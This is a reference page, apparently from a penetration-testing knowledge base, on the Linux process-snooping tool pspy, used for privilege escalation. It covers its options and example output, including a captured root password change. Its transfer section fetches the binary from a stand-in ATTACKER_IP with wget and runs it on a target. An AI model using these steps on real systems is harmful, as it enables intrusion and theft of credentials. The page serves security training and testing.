---
title: pspy
category: tool
subcategory: privilege-escalation
tags:
  - process-monitoring
  - linux
  - enumeration
  - cron-jobs
  - privilege-escalation
last_updated: 2025-12-27
---

# pspy

## Table of Contents

- [Overview](#overview)
- [Download and Transfer](#download-and-transfer)
- [Quick Start](#quick-start)
- [Key Options](#key-options)
- [Usage Examples](#usage-examples)
- [Documentation](#documentation)

## Overview

pspy is a command-line tool for **unprivileged Linux process monitoring**. It allows non-root users to snoop on processes run by other users, including:

- Cron jobs executed by root
- Commands with sensitive arguments (passwords, secrets)
- Short-lived processes that are hard to catch manually

**How it works**: pspy uses inotify watchers on common directories (`/usr`, `/tmp`, `/etc`, `/home`, `/var`, `/opt`) to trigger procfs scans when files are accessed, catching processes as they execute.

## Download and Transfer

| Binary | Architecture | Size | Description |
|--------|-------------|------|-------------|
| `pspy64` | 64-bit | ~4MB | Static, works on any Linux |
| `pspy32` | 32-bit | ~4MB | Static, works on any Linux |
| `pspy64s` | 64-bit | ~1MB | UPX compressed, requires libc |
| `pspy32s` | 32-bit | ~1MB | UPX compressed, requires libc |

**Download URL**: `https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64`

```bash
# On attacker machine - host the binary
python3 -m http.server 8080

# On target - download and execute
wget http://ATTACKER_IP:8080/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

## Quick Start

```bash
# Basic usage - monitor processes
./pspy64

# With colors (different UIDs get different colors)
./pspy64 -c

# Show file system events too
./pspy64 -pf

# Custom scan interval (1 second)
./pspy64 -i 1000
```

## Key Options

| Option | Description |
|--------|-------------|
| `-p` | Print commands to stdout (default: enabled) |
| `-f` | Print file system events (default: disabled) |
| `-c` | Color output by process UID |
| `-i <ms>` | Procfs scan interval in milliseconds (default: 100) |
| `-r <dir>` | Watch directory recursively (repeatable) |
| `-d <dir>` | Watch directory non-recursively (repeatable) |
| `--debug` | Show verbose error messages |

## Usage Examples

```bash
# Watch specific directories only
./pspy64 -r /home -r /var/spool/cron

# Fast scanning for short-lived processes
./pspy64 -i 50

# Disable process output, show only file events
./pspy64 -p=false -f

# Full monitoring with colors
./pspy64 -pfc -i 500
```

**Example output** (catching a cron job changing passwords):
```
2018/02/18 21:01:01 CMD: UID=0  PID=22 | python3 /root/scripts/password_reset.py
2018/02/18 21:01:01 CMD: UID=0  PID=23 | /bin/sh -c echo "SECRET123" | passwd user
```

## Documentation

| File | Description |
|------|-------------|
| [techniques.md](techniques.md) | How pspy works (inotify, procfs), versions, options, output interpretation |
| [examples.md](examples.md) | Practical privilege escalation examples and scenarios |
| [official_docs.md](official_docs.md) | GitHub repository information |

**External Resources**:
- [GitHub Repository](https://github.com/DominicBreuker/pspy)
- [Releases](https://github.com/DominicBreuker/pspy/releases)
